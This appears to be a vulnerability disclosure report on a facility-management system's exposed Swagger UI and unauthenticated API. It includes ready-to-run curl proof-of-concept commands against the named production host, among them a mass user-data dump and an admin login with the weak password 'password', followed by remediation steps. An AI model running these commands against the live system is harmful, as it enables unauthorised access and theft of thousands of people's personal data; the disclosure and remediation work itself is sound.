[PARA]1. Executive Summary
[PARA]During a security assessment of the MyCES-FMS (Facility Management System) infrastructure, the production backend API server was discovered to have a publicly accessible Swagger UI at the following URL:
[PARA]https://aziz.myces-fms.com/api
[PARA]The Swagger UI exposes the complete API documentation for the NestJS backend, revealing 1,705 API endpoints covering all modules of the system including authentication, user management, HR, finance, compliance, facility management, and more.
[PARA]Critical findings include:
[PARA]
[PARA]
[PARA]1,705 API endpoints fully documented and publicly accessible
[PARA]
[PARA]
[PARA]7,740 user records leaked via an unauthenticated endpoint
[PARA]
[PARA]
[PARA]1,744 password hashes exposed (crackable offline)
[PARA]
[PARA]
[PARA]84 national ID (IC) numbers exposed
[PARA]
[PARA]
[PARA]7,184 phone numbers exposed
[PARA]
[PARA]
[PARA]83 file upload endpoints with no authentication guard
[PARA]
[PARA]
[PARA]103 DELETE operations exposed
[PARA]
[PARA]
[PARA]Administrator credentials discovered via weak password
[PARA]
[PARA]
[PARA]Full system compromise possible with a single API call
[PARA]

[PARA]5. Vulnerability: Unauthenticated API Endpoints
[PARA]The Swagger specification declares ZERO security requirements for all 1,705 endpoints. While some endpoints have runtime guards (returning 403 when no valid session cookie is present), several critical endpoints are truly unprotected:
[PARA]
[PARA]
[PARA]Public (NoAuth) Endpoints
[PARA]POST /noauth/login — Login with email/password
POST /noauth/findUser/withCondition — Query users with arbitrary conditions
POST /noauth/registerAduan — Register complaint
GET /noauth/loginAduan/{IC} — Login using IC number only
POST /noauth/employee/set-password — Set employee password (requires token)
GET /noauth/employee/verify-setup-token/{token} — Verify setup token
[PARA]
[PARA]
[PARA]Auth Endpoints Without Swagger Security Declaration
[PARA]POST /auth/register — Create new user (runtime guard: 403)
POST /auth/reset — Reset user password (runtime guard: 403)
POST /auth/changepassword — Change password (runtime guard: 403)
POST /auth/delete — Delete user
POST /auth/usertype/addtype — Create user type
POST /auth/usertype/deletetype — Delete user type
POST /auth/addfeature — Create feature
POST /auth/deletefeat — Delete feature
POST /auth/deleteper — Delete permission
POST /auth/editper — Edit permission
POST /auth/user-company-role — Assign company role
POST /auth/switch-company — Switch company context
GET /auth/user/getall — Get all users (runtime guard: 403)

[PARA]8. Proof of Concept (PoC)
[PARA]
[PARA]
[PARA]PoC 1: Swagger UI Access
[PARA]Navigate to: https://aziz.myces-fms.com/api
[PARA]Result: Full Swagger UI with 1,705 endpoints accessible without authentication.
[PARA]
[PARA]
[PARA]PoC 2: Mass User Data Leak
[PARA]Command:
curl -X POST "https://aziz.myces-fms.com/noauth/findUser/withCondition" \
  -H "Content-Type: application/json" \
  -d '{"IC":"900101010101"}' -k

Result: 7,740 user records returned including password hashes, IC numbers, emails, and phone numbers.
[PARA]
[PARA]
[PARA]PoC 3: Administrator Login
[PARA]Command:
curl -X POST "https://aziz.myces-fms.com/noauth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@gmail.com","password":"password"}' -k -c cookie.txt

Result: Login successful as "admin" user type. Session cookie obtained.
[PARA]
[PARA]
[PARA]PoC 4: Authenticated API Access
[PARA]After login, all API endpoints become accessible with the session cookie:
curl -X GET "https://aziz.myces-fms.com/auth/user/getall" -k -b cookie.txt

This grants full administrative access to the system.
[PARA]
[PARA]
[PARA]PoC 5: Swagger JSON Download
[PARA]Command:
curl -X GET "https://aziz.myces-fms.com/api-json" -k -o swagger.json

Result: 631 KB Swagger JSON file downloaded containing the complete API specification.

[PARA]9. Impact Assessment
[PARA]
[PARA]
[PARA]Confidentiality Impact
[PARA]• 7,740 user PII records exposed (names, IC numbers, emails, phones)
• 1,744 password hashes available for offline cracking
• Complete API documentation reveals all business logic and data structures
• Company structure, departments, roles, and permissions fully enumerated
[PARA]
[PARA]
[PARA]Integrity Impact
[PARA]• Administrator account compromised (weak password "password")
• Ability to create, modify, or delete users, roles, and permissions
• Ability to upload arbitrary files to the server
• Ability to modify business-critical data (PPM, work orders, inventory, HR)
• 103 DELETE endpoints available for data destruction
[PARA]
[PARA]
[PARA]Availability Impact
[PARA]• Mass deletion of records possible via DELETE endpoints
• File system operations can delete or corrupt files
• Potential for DoS through resource-intensive API calls
[PARA]
[PARA]
[PARA]Business Impact
[PARA]• Regulatory non-compliance (PDPA 2010 — Personal Data Protection Act Malaysia)
• Reputational damage
• Potential legal liability
• Loss of customer/partner trust
• Operational disruption if data is deleted or corrupted

[PARA]11. Remediation
[PARA]
[PARA]
[PARA]Immediate Actions (within 24 hours)
[PARA]
[PARA]
[PARA]DISABLE Swagger UI in production immediately. Add environment check in main.ts:
[PARA]
[PARA]
[PARA]  if (process.env.NODE_ENV !== "production") { SwaggerModule.setup("api", app, document); }
[PARA]
[PARA]
[PARA]FIREWALL aziz.myces-fms.com to only allow whitelisted IP addresses
[PARA]
[PARA]
[PARA]CHANGE the administrator password immediately (currently "password")
[PARA]
[PARA]
[PARA]ROTATE all user passwords — 1,744 password hashes have been exposed
[PARA]
[PARA]
[PARA]BLOCK the /noauth/findUser/withCondition endpoint or require authentication
[PARA]
[PARA]
[PARA]Short-term Actions (within 1 week)
[PARA]
[PARA]
[PARA]Implement proper authentication guards on ALL API endpoints
[PARA]
[PARA]
[PARA]Add @ApiBearerAuth() or @ApiCookieAuth() decorators to Swagger configuration
[PARA]
[PARA]
[PARA]Conduct a full audit of file upload endpoints — implement file type validation, size limits, and malware scanning
[PARA]
[PARA]
[PARA]Review all DELETE endpoints — ensure proper authorization checks
[PARA]
[PARA]
[PARA]Implement rate limiting on all API endpoints
[PARA]
[PARA]
[PARA]Enable proper CORS configuration with specific origins only
[PARA]
[PARA]
[PARA]Add CSP headers to the API responses
[PARA]
[PARA]
[PARA]Implement audit logging for all sensitive operations
[PARA]
[PARA]
[PARA]Long-term Actions
[PARA]
[PARA]
[PARA]Implement API gateway with authentication and authorization
[PARA]
[PARA]
[PARA]Deploy Web Application Firewall (WAF) in front of the API
[PARA]
[PARA]
[PARA]Conduct regular penetration testing
[PARA]
[PARA]
[PARA]Implement secrets management (no hardcoded credentials)
[PARA]
[PARA]
[PARA]Set up monitoring and alerting for unusual API activity
[PARA]
[PARA]
[PARA]Implement proper password policy (minimum complexity, rotation)
[PARA]
[PARA]
[PARA]Consider implementing Multi-Factor Authentication (MFA)
[PARA]
[PARA]
[PARA]Data classification and PII handling policy review
